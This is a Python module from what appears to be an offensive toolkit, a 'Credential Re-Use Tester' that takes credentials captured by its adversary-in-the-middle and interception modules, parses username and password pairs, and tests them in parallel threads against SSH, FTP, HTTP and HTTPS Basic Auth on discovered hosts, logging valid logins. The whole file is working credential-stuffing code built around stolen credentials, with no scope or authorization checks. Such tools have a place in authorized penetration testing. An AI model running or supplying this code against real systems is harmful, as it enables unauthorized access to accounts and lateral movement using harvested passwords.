"""
modules/cred_tester.py — Credential Re-Use Tester
Pulls captured credentials from the Mission Database and tests them
against SSH, FTP, HTTP Basic Auth, and web login forms on discovered hosts.
No new dependencies — uses paramiko (already in requirements.txt).
"""

import re
import socket
import threading
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.database import db

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

console = Console()

# ── Result colours ─────────────────────────────────────────────────────────────
SUCCESS = "[bold green]✓ SUCCESS[/bold green]"
FAILED  = "[dim red]✗ FAILED[/dim red]"
ERROR   = "[dim yellow]⚠ ERROR[/dim yellow]"


# ══════════════════════════════════════════════════════════════════════════════
#  CREDENTIAL EXTRACTOR
# ══════════════════════════════════════════════════════════════════════════════

def _extract_creds_from_db() -> list:
    """
    Pull credentials captured by Burp-Proxy, Live Interceptor, and AitM-Proxy
    from the mission database and parse username:password pairs.
    Returns list of dicts: [{"username": ..., "password": ..., "source": ...}]
    """
    relevant_modules = {"Burp-Proxy", "Live Interceptor", "AitM-Proxy", "MITM-Payload"}
    creds = []
    seen  = set()

    try:
        logs = db.get_all()
    except Exception as e:
        console.print(f"[red][!] DB read error: {e}[/red]")
        return []

    for log in logs:
        module  = getattr(log, "module",  None) or log.get("module",  "")
        details = getattr(log, "details", None) or log.get("details", "")

        if module not in relevant_modules:
            continue

        # Match common key=value patterns
        patterns = [
            r"(?i)(?:username|user|login|email)\s*[=:]\s*([^\s&\n]+)",
            r"(?i)(?:password|passwd|pwd|pass)\s*[=:]\s*([^\s&\n]+)",
        ]

        usernames = re.findall(patterns[0], details)
        passwords = re.findall(patterns[1], details)

        for u in usernames:
            for p in passwords:
                key = f"{u}:{p}"
                if key not in seen and len(u) > 0 and len(p) > 0:
                    seen.add(key)
                    creds.append({
                        "username": u.strip(),
                        "password": p.strip(),
                        "source":   module,
                    })

    return creds


def _extract_hosts_from_db() -> list:
    """Pull unique target IPs/hosts from the mission database."""
    hosts = set()
    try:
        logs = db.get_all()
        for log in logs:
            target = getattr(log, "target", None) or log.get("target", "")
            if target and target not in ("Localhost", "localhost", ""):
                # Skip non-IP entries like file paths
                if not target.startswith("/") and len(target) < 64:
                    hosts.add(target.strip())
    except Exception:
        pass
    return sorted(hosts)


# ══════════════════════════════════════════════════════════════════════════════
#  PROTOCOL TESTERS
# ══════════════════════════════════════════════════════════════════════════════

def _test_ssh(host: str, username: str, password: str, port: int = 22,
              timeout: int = 6) -> str:
    if paramiko is None:
        return ERROR + " (paramiko not installed)"
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=host, port=port,
            username=username, password=password,
            timeout=timeout, banner_timeout=timeout,
            allow_agent=False, look_for_keys=False)
        client.close()
        return SUCCESS
    except paramiko.AuthenticationException:
        return FAILED
    except Exception as e:
        return f"{ERROR} ({str(e)[:40]})"


def _test_ftp(host: str, username: str, password: str,
              port: int = 21, timeout: int = 6) -> str:
    import ftplib
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return SUCCESS
    except ftplib.error_perm:
        return FAILED
    except Exception as e:
        return f"{ERROR} ({str(e)[:40]})"


def _test_http_basic(host: str, username: str, password: str,
                     port: int = 80, path: str = "/",
                     ssl: bool = False, timeout: int = 6) -> str:
    if requests is None:
        return ERROR + " (requests not installed)"
    scheme = "https" if ssl else "http"
    url    = f"{scheme}://{host}:{port}{path}"
    try:
        resp = requests.get(
            url, auth=(username, password),
            timeout=timeout, verify=False, allow_redirects=True)
        if resp.status_code == 200:
            return SUCCESS
        elif resp.status_code == 401:
            return FAILED
        else:
            return f"{ERROR} (HTTP {resp.status_code})"
    except Exception as e:
        return f"{ERROR} ({str(e)[:40]})"


def _port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class CredTester:

    def _get_creds_from_db(self):
        creds = _extract_creds_from_db()
        if not creds:
            console.print(
                "[yellow][!] No credentials found in the Mission Database.[/yellow]")
            console.print(
                "[dim]Run the Burp Proxy, Live Interceptor, or AitM Cloner "
                "first to capture credentials.[/dim]")
            return None
        console.print(
            f"[bold green][+] Found {len(creds)} credential pair(s) "
            f"in the Mission Database.[/bold green]")
        return creds

    def _get_creds_manual(self):
        creds = []
        console.print("[dim]Enter credentials to test. "
                      "Leave username blank when done.[/dim]")
        while True:
            u = questionary.text("Username (blank = done):", style=Q_STYLE).ask()
            if not u:
                break
            p = questionary.password("Password:", style=Q_STYLE).ask()
            if p:
                creds.append({"username": u, "password": p, "source": "manual"})
        return creds or None

    def _get_targets(self):
        db_hosts = _extract_hosts_from_db()

        mode = questionary.select(
            "Target selection:",
            choices=[
                f"Use discovered hosts from DB ({len(db_hosts)} hosts)",
                "Enter target manually",
            ],
            style=Q_STYLE,
        ).ask()

        if not mode:
            return []

        if "manually" in mode:
            t = questionary.text(
                "Target IP or hostname:", style=Q_STYLE).ask()
            return [t] if t else []

        if not db_hosts:
            console.print(
                "[yellow][!] No hosts in DB. "
                "Run Nmap first.[/yellow]")
            return []

        # Let user pick from discovered hosts
        choices = db_hosts + ["All hosts"]
        sel = questionary.checkbox(
            "Select targets to test:",
            choices=choices,
            style=Q_STYLE,
        ).ask()

        if not sel:
            return []
        if "All hosts" in sel:
            return db_hosts
        return sel

    def _select_protocols(self, host: str) -> list:
        """Check which ports are open and return matching protocol list."""
        checks  = [(22, "SSH"), (21, "FTP"), (80, "HTTP"), (443, "HTTPS")]
        open_protos = []
        for port, proto in checks:
            if _port_open(host, port, timeout=1.5):
                open_protos.append(proto)
        return open_protos

    def run_test(self, creds: list, targets: list):
        results = []
        lock    = threading.Lock()

        table = Table(
            title="Credential Re-Use Test Results",
            border_style="bold red", expand=True)
        table.add_column("Target",   style="white",   width=18)
        table.add_column("Protocol", style="cyan",    width=10)
        table.add_column("Username", style="yellow",  width=16)
        table.add_column("Password", style="yellow",  width=16)
        table.add_column("Result",   style="white",   width=22)

        total = len(targets) * len(creds)
        done  = [0]

        def test_one(host, cred):
            u = cred["username"]
            p = cred["password"]

            protos = self._select_protocols(host)
            if not protos:
                with lock:
                    done[0] += 1
                return

            for proto in protos:
                if proto == "SSH":
                    res = _test_ssh(host, u, p)
                elif proto == "FTP":
                    res = _test_ftp(host, u, p)
                elif proto == "HTTP":
                    res = _test_http_basic(host, u, p, port=80)
                elif proto == "HTTPS":
                    res = _test_http_basic(host, u, p, port=443, ssl=True)
                else:
                    res = ERROR

                with lock:
                    table.add_row(host, proto,
                                  u[:16], p[:16], res)
                    done[0] += 1

                    # Log successes to mission DB
                    if "SUCCESS" in res:
                        db.log(
                            "Cred-Tester", host,
                            f"Valid credentials via {proto}\n"
                            f"Username: {u}\nPassword: {p}",
                            "CRITICAL")
                        console.print(
                            f"\n[bold green][+] VALID CREDS: "
                            f"{u}:{p} on {host} ({proto})[/bold green]")

        threads = []
        with console.status(
                "[bold cyan]Testing credentials...[/bold cyan]",
                spinner="bouncingBar"):
            for host in targets:
                for cred in creds:
                    t = threading.Thread(
                        target=test_one, args=(host, cred), daemon=True)
                    threads.append(t)
                    t.start()
            for t in threads:
                t.join()

        console.print(table)

        successes = sum(
            1 for row in table.rows
            if "SUCCESS" in str(row)) if hasattr(table, "rows") else 0

        console.print(
            f"\n[bold green][+] Test complete. "
            f"Successes logged to Mission Database.[/bold green]")

    def run(self):
        draw_header("Credential Re-Use Tester")

        console.print(Panel(
            "Tests captured credentials from the Mission DB against\n"
            "SSH, FTP, HTTP Basic Auth, and HTTPS on discovered hosts.\n\n"
            "[dim]Credentials sourced from: Burp Proxy, Live Interceptor, AitM Cloner[/dim]",
            border_style="red"))

        # ── Credential source ─────────────────────────────────────────────────
        cred_source = questionary.select(
            "Credential source:",
            choices=[
                "Pull from Mission Database (auto)",
                "Enter manually",
            ],
            style=Q_STYLE,
        ).ask()

        if not cred_source:
            return

        if "Database" in cred_source:
            creds = self._get_creds_from_db()
        else:
            creds = self._get_creds_manual()

        if not creds:
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        # Show what we found
        t = Table(title="Credentials to Test", border_style="cyan")
        t.add_column("Username", style="yellow")
        t.add_column("Password", style="yellow")
        t.add_column("Source",   style="dim")
        for c in creds[:20]:
            t.add_row(c["username"], c["password"][:20], c["source"])
        if len(creds) > 20:
            console.print(f"[dim]...and {len(creds)-20} more[/dim]")
        console.print(t)

        # ── Target selection ──────────────────────────────────────────────────
        targets = self._get_targets()
        if not targets:
            console.print("[yellow][!] No targets selected.[/yellow]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        console.print(
            f"\n[*] Testing {len(creds)} credential pair(s) "
            f"against {len(targets)} host(s)...\n")

        self.run_test(creds, targets)
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_cred_tester():
    CredTester().run()


if __name__ == "__main__":
    run_cred_tester()